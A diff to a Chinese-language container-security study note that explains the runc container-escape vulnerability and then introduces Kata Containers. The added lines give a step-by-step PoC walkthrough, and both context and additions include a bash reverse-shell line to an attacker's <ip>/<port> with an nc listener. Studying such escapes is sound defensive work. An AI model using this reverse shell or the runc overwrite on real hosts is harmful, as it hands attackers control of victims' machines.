@@ -63,7 +63,17 @@ mycontainer
 - 复现方式：将Poc代码中main.go 文件中payload变量定义为`var payload="#!/bin/bash \n bash -i >& /dev/tcp/<ip>/<port> 0>&1"`(其中<ip>指攻击者机器的ip)，之后在受害者机器上编译执行main.go，然后在攻击者机器上开启nc监听，监听<port>端口，再次在受害者机器上进入或启动容器时，攻击者机器就可以拿到受害者机器的shell控制权；
 - 漏洞原理：攻击者可以通过修改容器内部某个可执行文件的方式，获取到宿主机上 runc 可执行文件的文件句柄（file descriptor）。随后，攻击者可以利用该句柄对原始的 runc 文件进行覆盖操作，将其替换为一个受控的恶意文件；
 
-![](images/cve.png)
+POC代码解析：
+
+1. `/bin/sh` -> `#!/proc/self/exe` 
+
+    将shell变成指向当前进程可执行文件的链接，让host的runc进程执行自身
+
+2. runc -> `#!/bin/bash \n bash -i >& /dev/tcp/<ip>/<port> 0>&1`
+
+    将runc覆盖为反弹shell
+
+3. 下次执行docker run/exec 时，就会使用runc二进制文件，执行攻击者的payload
 
 ## Kata Containers
 Kata Containers项目最初由Hyper.sh的runV项目与Intel的Clear Container合并而来，并于2017年开源。它的核心思想是，为每一个容器运行一个独立虚拟机，从而避免其与宿主机共享内核。即使攻击者在容器内部成功利用了内核漏洞攻破内核，他依然被限制在虚拟机内部，无法逃逸到宿主机上。
